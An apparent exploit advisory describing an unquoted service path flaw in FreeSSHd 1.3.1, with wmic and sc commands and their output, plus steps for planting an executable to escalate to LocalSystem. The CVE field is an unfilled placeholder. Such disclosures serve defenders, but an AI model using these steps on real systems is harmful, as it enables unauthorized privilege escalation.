Exploit Title:
FreeSSHd 1.3.1 - 'FreeSSHDService' Unquoted Service Path

Exploit Author:
boku

Date:
2020-02-10

Vulnerability Description:
The service path in FreeSSHd version 1.3.1 is improperly quoted, making it vulnerable to an Unquoted Service Path (CVE-XXXX). This allows a local attacker with limited privileges to gain elevated privileges by inserting a malicious executable in the service path.

Affected Software:
FreeSSHd version 1.3.1
Tested On: Windows 10 (32-bit)

Exploit Code:

C:\Users\nightelf>wmic service get name, pathname, startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i "freesshd" | findstr /i /v """
FreeSSHDService                           C:\Program Files\freeSSHd\FreeSSHDService.exe                                      Auto

C:\Users\nightelf>sc qc FreeSSHDService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: FreeSSHDService
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\freeSSHd\FreeSSHDService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : FreeSSHDService
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem

Steps to Reproduce:
Run the following command to identify the service path:
	wmic service get name, pathname, startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i "freesshd" | findstr /i /v """

Identify the unquoted service path in the result.
Craft a malicious executable and place it in a directory within the unquoted service path.
Restart the service to execute the malicious binary.